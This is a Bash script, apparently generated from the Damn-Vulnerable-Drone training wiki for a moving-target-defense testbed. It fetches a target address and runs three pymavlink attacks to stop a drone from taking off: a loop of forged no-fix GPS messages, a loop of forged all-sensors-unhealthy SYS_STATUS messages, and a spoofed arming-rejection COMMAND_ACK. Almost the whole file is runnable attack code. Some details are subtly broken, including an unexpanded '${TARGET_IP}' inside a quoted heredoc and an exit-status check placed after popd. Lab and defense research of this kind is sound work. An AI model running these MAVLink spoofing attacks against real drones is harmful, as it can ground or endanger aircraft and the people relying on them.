#!/usr/bin/env bash
# Auto-generated from: /home/kali/MTD_full_testbed/Damn-Vulnerable-Drone.wiki/Denial-of-Takeoff.md
# Created: 2025-09-14 13:46:03
# NOTE: 설명/서사는 제거되었고, 코드블록/프롬프트 명령만 포함됩니다.

# MTD_INTERFACE_START
# ==========================================================
# MTD-aware Target Acquisition
# This block dynamically queries the MTD interface for an active target.
# ==========================================================
echo "INFO: Querying MTD interface for active target..."

# --- Project Root Resolution ---
# 1. 현재 실행되는 쉘 스크립트의 실제 위치를 찾습니다.
SCRIPT_DIR=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )
# 2. 'dvd_lite' 폴더를 포함하는 프로젝트 루트 디렉토리를 찾습니다. (현재 위치에서 4단계 위)
PROJECT_ROOT=$(realpath "$SCRIPT_DIR/../../../../")
# -----------------------------

# PYTHONPATH 환경 변수 대신, 직접 프로젝트 루트로 이동하여 파이썬 모듈을 실행합니다.
# 이 방식은 'sudo'가 환경 변수를 초기화하는 문제를 우회할 수 있어 더 안정적입니다.
pushd "$PROJECT_ROOT" > /dev/null
TARGET_ADDR=$(python3 -m dvd_lite.dvd_attacks_lpc.interface)
popd > /dev/null

if [ $? -ne 0 ] || [ -z "$TARGET_ADDR" ]; then
    echo "ERROR: Could not get active target from MTD interface. Aborting attack."
    exit 1
fi

# 콜론을 기준으로 IP와 PORT를 분리하여 변수에 저장합니다.
TARGET_IP=$(echo $TARGET_ADDR | cut -d: -f1)
TARGET_PORT=$(echo $TARGET_ADDR | cut -d: -f2)

echo "INFO: Active target acquired -> ${TARGET_IP}:${TARGET_PORT}"
# MTD_INTERFACE_END

set -euo pipefail

# 기준 경로 (요구사항)
export BASE="${BASE:-$PWD}"

# 공통 로그 연결(선택사항) - 존재 시 로드
if [[ -f "$BASE/00_env.sh" ]]; then . "$BASE/00_env.sh"; else
  DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"; mkdir -p "$(dirname "$DVD_LOG")"
  log(){ echo "[`date +%F_%T`] $*"; }; export -f log
fi

log "[ATTACK] id=denial-of-takeoff src=Denial-of-Takeoff.md"
log "[BLOCK 1] type=python"
python3 - <<'PY'
# --- argv glue for converter ---
import os, sys, re
if len(sys.argv) <= 1:
    ep = os.environ.get('TARGET_EP') or os.environ.get('MAV_EP', 'udp:${TARGET_IP}:${TARGET_PORT}')
    if ep.startswith('udp:'):
        try:
            _, rest = ep.split(':', 1)
            ep = rest
        except ValueError:
            pass
    # expect ip:port
    if re.match(r'^\d{1,3}(\.\d{1,3}){3}:\d+$', ep):
        sys.argv = [sys.argv[0], ep]
# gps_glitch_injection.py

from pymavlink import mavutil
import time
import sys

def main(target_ip, target_port):
    master = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
    master.wait_heartbeat()
    print("Connected to drone. Sending bad GPS data...")

    while True:
        master.mav.gps_raw_int_send(
            time_usec=int(time.time() * 1e6),
            fix_type=1,  # No usable fix
            lat=0,
            lon=0,
            alt=0,
            eph=1000,
            epv=1000,
            vel=0,
            cog=0,
            satellites_visible=0
        )
        print("[!] Spoofed bad GPS fix sent")
        time.sleep(1)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python gps_glitch_injection.py <target_ip:port>")
        sys.exit(1)

    ip, port = sys.argv[1].split(":")
    main(ip, int(port))
PY

log "[BLOCK 2] type=python"
python3 - <<'PY'
# --- argv glue for converter ---
import os, sys, re
if len(sys.argv) <= 1:
    ep = os.environ.get('TARGET_EP') or os.environ.get('MAV_EP', 'udp:${TARGET_IP}:${TARGET_PORT}')
    if ep.startswith('udp:'):
        try:
            _, rest = ep.split(':', 1)
            ep = rest
        except ValueError:
            pass
    # expect ip:port
    if re.match(r'^\d{1,3}(\.\d{1,3}){3}:\d+$', ep):
        sys.argv = [sys.argv[0], ep]
# sys_status_corruption.py

from pymavlink import mavutil
import time
import sys

def main(target_ip, target_port):
    master = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
    master.wait_heartbeat()
    print("Connected to drone. Sending fake SYS_STATUS...")

    while True:
        master.mav.sys_status_send(
            onboard_control_sensors_present=0xFFFFFFFF,
            onboard_control_sensors_enabled=0xFFFFFFFF,
            onboard_control_sensors_health=0x00000000,
            load=500,
            voltage_battery=12000,
            current_battery=100,
            battery_remaining=90,
            drop_rate_comm=0,
            errors_comm=0,
            errors_count1=1,
            errors_count2=1,
            errors_count3=1,
            errors_count4=1
        )
        print("[!] Spoofed unhealthy SYS_STATUS sent")
        time.sleep(1)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python sys_status_corruption.py <target_ip:port>")
        sys.exit(1)

    ip, port = sys.argv[1].split(":")
    main(ip, int(port))
PY

log "[BLOCK 3] type=python"
python3 - <<'PY'
# --- argv glue for converter ---
import os, sys, re
if len(sys.argv) <= 1:
    ep = os.environ.get('TARGET_EP') or os.environ.get('MAV_EP', 'udp:${TARGET_IP}:${TARGET_PORT}')
    if ep.startswith('udp:'):
        try:
            _, rest = ep.split(':', 1)
            ep = rest
        except ValueError:
            pass
    # expect ip:port
    if re.match(r'^\d{1,3}(\.\d{1,3}){3}:\d+$', ep):
        sys.argv = [sys.argv[0], ep]
# command_ack_block_arm.py

from pymavlink import mavutil
import sys

def main(target_ip, target_port):
    master = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
    master.wait_heartbeat()
    print("Connected. Sending spoofed COMMAND_ACK to block arming...")

    master.mav.command_ack_send(
        command=mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,
        result=mavutil.mavlink.MAV_RESULT_FAILED
    )
    print("[!] Spoofed arming rejection sent")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python command_ack_block_arm.py <target_ip:port>")
        sys.exit(1)

    ip, port = sys.argv[1].split(":")
    main(ip, int(port))
PY

